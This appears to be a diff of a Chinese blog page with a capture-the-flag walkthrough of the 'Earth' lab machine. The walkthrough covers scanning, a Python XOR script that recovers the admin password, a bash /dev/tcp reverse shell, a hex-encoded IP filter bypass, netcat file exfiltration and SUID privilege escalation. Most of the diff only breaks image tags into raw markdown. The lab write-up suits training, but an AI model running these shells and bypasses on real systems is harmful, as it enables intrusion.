@@ -20,7 +20,7 @@ article: http://ogp.me/ns/article#">
   
   
   
-  <meta name="description" content="1234nmap-sn192.168.59.1/24或者使用arp-scan-l#发现存活主机192.168.59.138其他ip同网段端口扫描12nmap-sV-p-192.168.59.138探测主机开放端口及服务版本访问http://192.168.59.138:80Earth靶机使用了“虚拟主机”技术">
+  <meta name="description" content="1234nmap-sn192.168.59.1/24或者使用arp-scan-l#发现存活主机192.168.59.138其他ip同网段端口扫描12nmap-sV-p-192.168.59.138探测主机开放端口及服务版本访问http://192.168.59.138:80![](&amp;#x2F;对earth的渗">
 
 
 <script src="/js/wang.js"></script>
@@ -136,7 +136,7 @@ article: http://ogp.me/ns/article#">
       
       
         <span class="post-updated">
-          最后更新于 <time datetime="2026-01-19T11:36:31.048Z">2026-01-19</time>
+          最后更新于 <time datetime="2026-01-19T11:41:05.341Z">2026-01-19</time>
         </span>
       
       <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
@@ -153,11 +153,11 @@ article: http://ogp.me/ns/article#">
 
 <p><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image.png"></p>
 <p>访问<a target="_blank" rel="noopener" href="http://192.168.59.138/">http://192.168.59.138:80</a></p>
-<p><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(1).png"></p>
+<p>![](&#x2F;对earth的渗透测试&#x2F;image (1).png)</p>
 <p>Earth 靶机使用了“虚拟主机”技术，直接访问 IP 可能只显示 404。我们需要通过 443 端口的 SSL 证书找到它真实的域名。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p 443 --script ssl-cert 192.168.59.138</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(2).png"></p>
+<p>![](&#x2F;对earth的渗透测试&#x2F;image (2).png)</p>
 <p><strong>修改 Kali 的 Hosts 文件</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano /etc/hosts</span><br></pre></td></tr></table></figure>
 
@@ -165,49 +165,49 @@ article: http://ogp.me/ns/article#">
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.59.138  earth.local terratest.earth.local</span><br></pre></td></tr></table></figure>
 
 <p>访问<a target="_blank" rel="noopener" href="http://earth.local/">http://earth.local</a></p>
-<p><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(3).png"></p>
+<p>![](&#x2F;对earth的渗透测试&#x2F;image (3).png)</p>
 <p>访问<a target="_blank" rel="noopener" href="https://terratest.earth.local/">https://terratest.earth.local</a></p>
-<p><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(4).png"></p>
+<p>![](&#x2F;对earth的渗透测试&#x2F;image (4).png)</p>
 <p>目录扫描（关键）： 使用工具扫描该站点的隐藏目录。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch https://terratest.earth.local</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(5).png"></p>
-<p><img src="/h/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(6).png"><br><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(7).png"><br>最后发现文件名但是不知道后缀，对常见的文件后缀进行测试，发现是txt</p>
-<p><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(8).png"></p>
-<p>发现XOR和RSA加密方法，管理员用户名为terra，以及用来测试加密的文件：testdata.txt<br><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(9).png"></p>
+<p>![](&#x2F;对earth的渗透测试&#x2F;image (5).png)</p>
+<p>![](h&#x2F;对earth的渗透测试&#x2F;image (6).png)<br>![](&#x2F;对earth的渗透测试&#x2F;image (7).png)<br>最后发现文件名但是不知道后缀，对常见的文件后缀进行测试，发现是txt</p>
+<p>![](&#x2F;对earth的渗透测试&#x2F;image (8).png)</p>
+<p>发现XOR和RSA加密方法，管理员用户名为terra，以及用来测试加密的文件：testdata.txt<br>![](&#x2F;对earth的渗透测试&#x2F;image (9).png)</p>
 <p>学习一下XOR加密</p>
 <p><a target="_blank" rel="noopener" href="https://www.yuque.com/u54108308/gtm17r/xek2hrgcbtk4m4i6" title="XOR加密">XOR加密</a></p>
 <p>利用python脚本对信息收集到的密文和密钥进行XOR解密</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">x = &quot;4163636f7264696e6720746f20726164696f6d657472696320646174696e6720657374696d6174696f6e20616e64206f746865722065766964656e63652c20456172746820666f726d6564206f76657220342e352062696c6c696f6e2079656172732061676f2e2057697468696e207468652066697273742062696c6c696f6e207965617273206f66204561727468277320686973746f72792c206c69666520617070656172656420696e20746865206f6365616e7320616e6420626567616e20746f2061666665637420456172746827732061746d6f73706865726520616e6420737572666163652c206c656164696e6720746f207468652070726f6c696665726174696f6e206f6620616e6165726f62696320616e642c206c617465722c206165726f626963206f7267616e69736d732e20536f6d652067656f6c6f676963616c2065766964656e636520696e646963617465732074686174206c696665206d617920686176652061726973656e206173206561726c7920617320342e312062696c6c696f6e2079656172732061676f2e&quot;</span><br><span class="line">y = &quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&quot;</span><br><span class="line"></span><br><span class="line">x_int = int(x, 16)</span><br><span class="line">y_int = int(y, 16)</span><br><span class="line"></span><br><span class="line">print(f&quot;交换前: x=&#123;x_int&#125;, y=&#123;y_int&#125;&quot;)</span><br><span class="line"></span><br><span class="line">p = x_int ^ y_int</span><br><span class="line"></span><br><span class="line">print(f&quot;交换后: p=&#123;p&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 将结果转换为十六进制字符串</span><br><span class="line">p_hex = hex(p)[2:]  # 去掉&#x27;0x&#x27;前缀</span><br><span class="line"></span><br><span class="line"># 如果十六进制字符串长度为奇数，前面补0</span><br><span class="line">if len(p_hex) % 2 != 0:</span><br><span class="line">    p_hex = &#x27;0&#x27; + p_hex</span><br><span class="line"></span><br><span class="line"># 将十六进制字符串转换为字节，然后解码为字符</span><br><span class="line">try:</span><br><span class="line">    # 将十六进制字符串每两个字符一组转换为字节</span><br><span class="line">    byte_data = bytes.fromhex(p_hex)</span><br><span class="line">    # 尝试解码为字符串</span><br><span class="line">    result_str = byte_data.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)</span><br><span class="line">    print(f&quot;转换为字符: &#123;result_str&#125;&quot;)</span><br><span class="line">except ValueError as e:</span><br><span class="line">    print(f&quot;转换失败: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">得到结果：</span><br><span class="line">earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat</span><br></pre></td></tr></table></figure>
 
 <p>经过分析得到密码为earthclimatechangebad4humans</p>
-<p>访问<a target="_blank" rel="noopener" href="http://earth.local/admin%E8%BF%9B%E5%85%A5%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%EF%BC%8C%E8%BE%93%E5%85%A5%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%99%BB%E5%85%A5%E7%AE%A1%E7%90%86%E5%91%98%E7%95%8C%E9%9D%A2">http://earth.local/admin进入登录界面，输入账号密码登入管理员界面</a><br><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(10).png"></p>
+<p>访问<a target="_blank" rel="noopener" href="http://earth.local/admin%E8%BF%9B%E5%85%A5%E7%99%BB%E5%BD%95%E7%95%8C%E9%9D%A2%EF%BC%8C%E8%BE%93%E5%85%A5%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%99%BB%E5%85%A5%E7%AE%A1%E7%90%86%E5%91%98%E7%95%8C%E9%9D%A2">http://earth.local/admin进入登录界面，输入账号密码登入管理员界面</a><br>![](&#x2F;对earth的渗透测试&#x2F;image (10).png)</p>
 <p>find命令查找相关文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;*flag*.txt&quot;</span><br><span class="line">#然后cat读取flag文件</span><br><span class="line">cat /var/earth_web/user_flag.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(11).png"></p>
-<p><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(12).png"></p>
+<p>![](&#x2F;对earth的渗透测试&#x2F;image (11).png)</p>
+<p>![](&#x2F;对earth的渗透测试&#x2F;image (12).png)</p>
 <p><strong>反弹shell</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 攻击机开启监听</span><br><span class="line">nc -lvnp 7777</span><br><span class="line"># 反弹shell</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.59.128/7777 0&gt;&amp;1</span><br><span class="line">#利用十六进制对ip进行绕过</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/0xC0.0xA8.0x3B.0x80/7777 0&gt;&amp;1</span><br><span class="line">#成功反弹shell</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(13).png"></p>
+<p>![](&#x2F;对earth的渗透测试&#x2F;image (13).png)</p>
 <p><strong>接下来就是提权了</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#寻找具有root权限的文件</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">#发现一个reset_root文件，从文件名看可能是重置root用户</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(14).png"><br><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(15).png"></p>
+<p>![](&#x2F;对earth的渗透测试&#x2F;image (14).png)<br>![](&#x2F;对earth的渗透测试&#x2F;image (15).png)</p>
 <p>发现关键语句：重置root密码为Earth</p>
-<p><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(16).png"></p>
+<p>![](&#x2F;对earth的渗透测试&#x2F;image (16).png)</p>
 <p>尝试运行发现重置失败</p>
 <p>将文件发到kali上分析一下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 攻击机激活nc监听</span><br><span class="line">nc -lp 6666 &gt; reset_root</span><br><span class="line"># 目标机发送文件</span><br><span class="line">nc -v 192.168.59.128 6666 &lt; /usr/bin/reset_root</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(17).png">结果显示没有这三个文件或目录，在目标机中新建，再运行reset_root</p>
+<p>![](&#x2F;对earth的渗透测试&#x2F;image (17).png)结果显示没有这三个文件或目录，在目标机中新建，再运行reset_root</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">touch /dev/shm/kHgTFI5G</span><br><span class="line">touch /dev/shm/Zw7bV9U5</span><br><span class="line">touch /tmp/kcM0Wewe</span><br><span class="line"># 运行</span><br><span class="line">/usr/bin/reset_root</span><br></pre></td></tr></table></figure>
 
-<p><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(18).png">成功重置密码，拿到root权限</p>
-<p><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(19).png"></p>
+<p>![](&#x2F;对earth的渗透测试&#x2F;image (18).png)成功重置密码，拿到root权限</p>
+<p>![](&#x2F;对earth的渗透测试&#x2F;image (19).png)</p>
 <p>找到管理员flag</p>
-<p><img src="/%E5%AF%B9earth%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image(20).png">[[]]</p>
+<p>![](&#x2F;对earth的渗透测试&#x2F;image (20).png)[[]]</p>
 
     </div>
   </article>
